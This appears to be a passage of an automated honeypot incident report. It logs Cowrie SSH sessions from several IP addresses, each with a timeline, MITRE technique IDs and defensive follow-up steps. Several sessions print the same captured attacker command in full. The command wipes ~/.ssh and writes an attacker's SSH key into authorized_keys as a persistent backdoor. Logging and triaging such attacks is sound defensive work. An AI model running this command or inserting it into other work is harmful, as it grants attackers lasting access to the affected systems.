| `2026-04-23 13:12:29` | `cowrie.command.input` |
| `2026-04-23 13:12:29` | `cowrie.command.failed` |
| `2026-04-23 13:12:29` | `cowrie.log.closed` |
| `2026-04-23 13:12:30` | `cowrie.session.params` |
| `2026-04-23 13:12:30` | `cowrie.command.input` |
| `2026-04-23 13:12:30` | `cowrie.session.file_download` |
| `2026-04-23 13:12:30` | `cowrie.log.closed` |
| `2026-04-23 13:12:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.24.47[.]94` to AbuseIPDB if not already reported
- [ ] Block `46.24.47[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3608ce7a9d85

| Field | Detail |
|---|---|
| **Source IP** | `46.24.47[.]94` |
| **First Seen** | 2026-04-23 13:12 |
| **Last Seen** | 2026-04-23 13:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:12:32` | `cowrie.session.connect` |
| `2026-04-23 13:12:32` | `cowrie.client.version` |
| `2026-04-23 13:12:32` | `cowrie.client.kex` |
| `2026-04-23 13:12:32` | `cowrie.login.success` |
| `2026-04-23 13:12:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.24.47[.]94` to AbuseIPDB if not already reported
- [ ] Block `46.24.47[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e9d9372fa59

| Field | Detail |
|---|---|
| **Source IP** | `157.7.113[.]83` |
| **First Seen** | 2026-04-23 13:17 |
| **Last Seen** | 2026-04-23 13:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:17:31` | `cowrie.session.connect` |
| `2026-04-23 13:17:31` | `cowrie.client.version` |
| `2026-04-23 13:17:31` | `cowrie.client.kex` |
| `2026-04-23 13:17:32` | `cowrie.login.success` |
| `2026-04-23 13:17:32` | `cowrie.session.params` |
| `2026-04-23 13:17:32` | `cowrie.command.input` |
| `2026-04-23 13:17:32` | `cowrie.command.failed` |
| `2026-04-23 13:17:32` | `cowrie.log.closed` |
| `2026-04-23 13:17:33` | `cowrie.session.params` |
| `2026-04-23 13:17:33` | `cowrie.command.input` |
| `2026-04-23 13:17:33` | `cowrie.session.file_download` |
| `2026-04-23 13:17:33` | `cowrie.log.closed` |
| `2026-04-23 13:17:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.7.113[.]83` to AbuseIPDB if not already reported
- [ ] Block `157.7.113[.]83` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8c509d45251

| Field | Detail |
|---|---|
| **Source IP** | `157.7.113[.]83` |
| **First Seen** | 2026-04-23 13:17 |
| **Last Seen** | 2026-04-23 13:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:17:36` | `cowrie.session.connect` |
| `2026-04-23 13:17:36` | `cowrie.client.version` |
| `2026-04-23 13:17:36` | `cowrie.client.kex` |
| `2026-04-23 13:17:36` | `cowrie.login.success` |
| `2026-04-23 13:17:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.7.113[.]83` to AbuseIPDB if not already reported
- [ ] Block `157.7.113[.]83` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b91e876fdec

| Field | Detail |
|---|---|
| **Source IP** | `103.183.62[.]1` |
| **First Seen** | 2026-04-23 13:21 |
| **Last Seen** | 2026-04-23 13:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:21:02` | `cowrie.session.connect` |
| `2026-04-23 13:21:02` | `cowrie.client.version` |
| `2026-04-23 13:21:02` | `cowrie.client.kex` |
| `2026-04-23 13:21:03` | `cowrie.login.success` |
| `2026-04-23 13:21:03` | `cowrie.session.params` |
| `2026-04-23 13:21:03` | `cowrie.command.input` |
| `2026-04-23 13:21:03` | `cowrie.command.failed` |
| `2026-04-23 13:21:03` | `cowrie.log.closed` |
| `2026-04-23 13:21:03` | `cowrie.session.params` |
| `2026-04-23 13:21:03` | `cowrie.command.input` |
| `2026-04-23 13:21:03` | `cowrie.session.file_download` |
| `2026-04-23 13:21:03` | `cowrie.log.closed` |
| `2026-04-23 13:21:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.62[.]1` to AbuseIPDB if not already reported
- [ ] Block `103.183.62[.]1` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79e190a42238

| Field | Detail |
|---|---|
| **Source IP** | `103.183.62[.]1` |
| **First Seen** | 2026-04-23 13:21 |
| **Last Seen** | 2026-04-23 13:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:21:05` | `cowrie.session.connect` |
| `2026-04-23 13:21:05` | `cowrie.client.version` |
| `2026-04-23 13:21:05` | `cowrie.client.kex` |
| `2026-04-23 13:21:05` | `cowrie.login.success` |
| `2026-04-23 13:21:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.62[.]1` to AbuseIPDB if not already reported
- [ ] Block `103.183.62[.]1` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffe6b54517e0

| Field | Detail |
|---|---|
| **Source IP** | `121.122.65[.]136` |
| **First Seen** | 2026-04-23 13:37 |
| **Last Seen** | 2026-04-23 13:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:37:59` | `cowrie.session.connect` |
| `2026-04-23 13:37:59` | `cowrie.client.version` |
| `2026-04-23 13:37:59` | `cowrie.client.kex` |
| `2026-04-23 13:38:00` | `cowrie.login.success` |
| `2026-04-23 13:38:00` | `cowrie.session.params` |
| `2026-04-23 13:38:00` | `cowrie.command.input` |
| `2026-04-23 13:38:00` | `cowrie.command.failed` |
| `2026-04-23 13:38:00` | `cowrie.log.closed` |
| `2026-04-23 13:38:00` | `cowrie.session.params` |
| `2026-04-23 13:38:00` | `cowrie.command.input` |
| `2026-04-23 13:38:00` | `cowrie.session.file_download` |
| `2026-04-23 13:38:00` | `cowrie.log.closed` |
| `2026-04-23 13:38:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.122.65[.]136` to AbuseIPDB if not already reported
- [ ] Block `121.122.65[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e76d811f70d

| Field | Detail |
|---|---|
| **Source IP** | `121.122.65[.]136` |
| **First Seen** | 2026-04-23 13:38 |
| **Last Seen** | 2026-04-23 13:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:38:02` | `cowrie.session.connect` |
| `2026-04-23 13:38:02` | `cowrie.client.version` |
| `2026-04-23 13:38:02` | `cowrie.client.kex` |
| `2026-04-23 13:38:02` | `cowrie.login.success` |
| `2026-04-23 13:38:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.122.65[.]136` to AbuseIPDB if not already reported
- [ ] Block `121.122.65[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6986118c1637

| Field | Detail |
|---|---|
| **Source IP** | `121.122.65[.]136` |
| **First Seen** | 2026-04-23 13:38 |
| **Last Seen** | 2026-04-23 13:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:38:57` | `cowrie.session.connect` |
| `2026-04-23 13:38:57` | `cowrie.client.version` |
| `2026-04-23 13:38:57` | `cowrie.client.kex` |
| `2026-04-23 13:38:57` | `cowrie.login.success` |
| `2026-04-23 13:38:57` | `cowrie.session.params` |
| `2026-04-23 13:38:57` | `cowrie.command.input` |
| `2026-04-23 13:38:57` | `cowrie.command.failed` |
| `2026-04-23 13:38:58` | `cowrie.log.closed` |
| `2026-04-23 13:38:58` | `cowrie.session.params` |
| `2026-04-23 13:38:58` | `cowrie.command.input` |
| `2026-04-23 13:38:58` | `cowrie.session.file_download` |
| `2026-04-23 13:38:58` | `cowrie.log.closed` |
| `2026-04-23 13:39:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.122.65[.]136` to AbuseIPDB if not already reported
- [ ] Block `121.122.65[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc7ff24a1ba7

| Field | Detail |
|---|---|
| **Source IP** | `121.122.65[.]136` |
| **First Seen** | 2026-04-23 13:38 |
| **Last Seen** | 2026-04-23 13:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:38:59` | `cowrie.session.connect` |
| `2026-04-23 13:38:59` | `cowrie.client.version` |
| `2026-04-23 13:39:00` | `cowrie.client.kex` |
| `2026-04-23 13:39:00` | `cowrie.login.success` |
| `2026-04-23 13:39:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.122.65[.]136` to AbuseIPDB if not already reported
- [ ] Block `121.122.65[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c634ec480172

| Field | Detail |
|---|---|
| **Source IP** | `121.122.65[.]136` |
| **First Seen** | 2026-04-23 13:39 |
| **Last Seen** | 2026-04-23 13:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:39:59` | `cowrie.session.connect` |
| `2026-04-23 13:39:59` | `cowrie.client.version` |
| `2026-04-23 13:39:59` | `cowrie.client.kex` |
| `2026-04-23 13:39:59` | `cowrie.login.success` |
| `2026-04-23 13:40:00` | `cowrie.session.params` |
| `2026-04-23 13:40:00` | `cowrie.command.input` |
| `2026-04-23 13:40:00` | `cowrie.command.failed` |
| `2026-04-23 13:40:00` | `cowrie.log.closed` |
| `2026-04-23 13:40:00` | `cowrie.session.params` |
| `2026-04-23 13:40:00` | `cowrie.command.input` |
| `2026-04-23 13:40:00` | `cowrie.session.file_download` |
| `2026-04-23 13:40:00` | `cowrie.log.closed` |
| `2026-04-23 13:40:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.122.65[.]136` to AbuseIPDB if not already reported
- [ ] Block `121.122.65[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ecd9fd693c1

| Field | Detail |
|---|---|
| **Source IP** | `121.122.65[.]136` |
| **First Seen** | 2026-04-23 13:40 |
| **Last Seen** | 2026-04-23 13:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:40:02` | `cowrie.session.connect` |
| `2026-04-23 13:40:02` | `cowrie.client.version` |
| `2026-04-23 13:40:02` | `cowrie.client.kex` |
| `2026-04-23 13:40:02` | `cowrie.login.success` |
| `2026-04-23 13:40:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.122.65[.]136` to AbuseIPDB if not already reported
- [ ] Block `121.122.65[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddaabef12c30

| Field | Detail |
|---|---|
| **Source IP** | `121.122.65[.]136` |
| **First Seen** | 2026-04-23 13:41 |
| **Last Seen** | 2026-04-23 13:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:41:00` | `cowrie.session.connect` |
| `2026-04-23 13:41:00` | `cowrie.client.version` |
| `2026-04-23 13:41:00` | `cowrie.client.kex` |
| `2026-04-23 13:41:00` | `cowrie.login.success` |
| `2026-04-23 13:41:00` | `cowrie.session.params` |
| `2026-04-23 13:41:00` | `cowrie.command.input` |
| `2026-04-23 13:41:00` | `cowrie.command.failed` |
| `2026-04-23 13:41:01` | `cowrie.log.closed` |
| `2026-04-23 13:41:01` | `cowrie.session.params` |
| `2026-04-23 13:41:01` | `cowrie.command.input` |
| `2026-04-23 13:41:01` | `cowrie.session.file_download` |
| `2026-04-23 13:41:01` | `cowrie.log.closed` |
| `2026-04-23 13:41:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.122.65[.]136` to AbuseIPDB if not already reported
- [ ] Block `121.122.65[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2f5b0663b35

| Field | Detail |
|---|---|
| **Source IP** | `121.122.65[.]136` |
| **First Seen** | 2026-04-23 13:41 |
| **Last Seen** | 2026-04-23 13:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:41:02` | `cowrie.session.connect` |
| `2026-04-23 13:41:02` | `cowrie.client.version` |
| `2026-04-23 13:41:02` | `cowrie.client.kex` |
| `2026-04-23 13:41:03` | `cowrie.login.success` |
| `2026-04-23 13:41:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.122.65[.]136` to AbuseIPDB if not already reported
- [ ] Block `121.122.65[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79a9ef4c46db

| Field | Detail |
|---|---|
| **Source IP** | `121.122.65[.]136` |
| **First Seen** | 2026-04-23 13:42 |
| **Last Seen** | 2026-04-23 13:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:42:01` | `cowrie.session.connect` |
| `2026-04-23 13:42:01` | `cowrie.client.version` |
| `2026-04-23 13:42:01` | `cowrie.client.kex` |
| `2026-04-23 13:42:01` | `cowrie.login.success` |
| `2026-04-23 13:42:01` | `cowrie.session.params` |
| `2026-04-23 13:42:01` | `cowrie.command.input` |
| `2026-04-23 13:42:01` | `cowrie.command.failed` |
| `2026-04-23 13:42:02` | `cowrie.log.closed` |
| `2026-04-23 13:42:02` | `cowrie.session.params` |
| `2026-04-23 13:42:02` | `cowrie.command.input` |
| `2026-04-23 13:42:02` | `cowrie.session.file_download` |
| `2026-04-23 13:42:02` | `cowrie.log.closed` |
| `2026-04-23 13:42:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.122.65[.]136` to AbuseIPDB if not already reported
- [ ] Block `121.122.65[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a23f78a6532f

| Field | Detail |
|---|---|
| **Source IP** | `121.122.65[.]136` |
| **First Seen** | 2026-04-23 13:42 |
| **Last Seen** | 2026-04-23 13:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:42:03` | `cowrie.session.connect` |
| `2026-04-23 13:42:03` | `cowrie.client.version` |
| `2026-04-23 13:42:03` | `cowrie.client.kex` |
| `2026-04-23 13:42:04` | `cowrie.login.success` |
| `2026-04-23 13:42:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.122.65[.]136` to AbuseIPDB if not already reported
- [ ] Block `121.122.65[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77e0634dffaa

| Field | Detail |
|---|---|
| **Source IP** | `121.122.65[.]136` |
| **First Seen** | 2026-04-23 13:44 |
| **Last Seen** | 2026-04-23 13:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:44:53` | `cowrie.session.connect` |
| `2026-04-23 13:44:53` | `cowrie.client.version` |
| `2026-04-23 13:44:54` | `cowrie.client.kex` |
| `2026-04-23 13:44:54` | `cowrie.login.success` |
| `2026-04-23 13:44:54` | `cowrie.session.params` |
| `2026-04-23 13:44:54` | `cowrie.command.input` |
| `2026-04-23 13:44:54` | `cowrie.command.failed` |
| `2026-04-23 13:44:54` | `cowrie.log.closed` |
| `2026-04-23 13:44:54` | `cowrie.session.params` |
| `2026-04-23 13:44:54` | `cowrie.command.input` |
| `2026-04-23 13:44:54` | `cowrie.session.file_download` |
| `2026-04-23 13:44:54` | `cowrie.log.closed` |
| `2026-04-23 13:44:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.122.65[.]136` to AbuseIPDB if not already reported
- [ ] Block `121.122.65[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bee1cba40df

| Field | Detail |
|---|---|
| **Source IP** | `121.122.65[.]136` |
| **First Seen** | 2026-04-23 13:44 |
| **Last Seen** | 2026-04-23 13:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:44:56` | `cowrie.session.connect` |
| `2026-04-23 13:44:56` | `cowrie.client.version` |
| `2026-04-23 13:44:56` | `cowrie.client.kex` |
| `2026-04-23 13:44:56` | `cowrie.login.success` |
| `2026-04-23 13:44:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.122.65[.]136` to AbuseIPDB if not already reported
- [ ] Block `121.122.65[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

